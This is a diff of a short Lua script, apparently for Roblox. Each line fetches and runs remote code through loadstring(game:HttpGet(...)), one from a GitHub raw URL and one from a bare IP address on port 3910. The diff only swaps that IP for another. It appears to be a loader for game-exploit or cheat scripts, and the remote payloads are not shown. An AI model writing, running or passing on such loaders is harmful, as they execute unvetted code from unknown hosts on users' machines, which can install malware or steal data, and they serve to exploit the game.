@@ -1,4 +1,4 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
 
 ID="05847932-6151-4aea-9e13-2723c23de8a7";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
